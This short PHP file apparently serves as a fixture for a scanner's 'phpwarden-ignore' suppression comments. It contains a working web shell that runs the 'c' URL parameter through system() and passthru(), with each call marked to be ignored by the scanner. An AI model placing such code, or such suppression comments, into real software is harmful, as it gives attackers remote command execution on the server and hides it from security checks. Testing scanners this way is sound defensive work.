<?php
// phpwarden-ignore: cmd-system
system($_GET['c']);
passthru($_GET['c']); // phpwarden-ignore: cmd-passthru
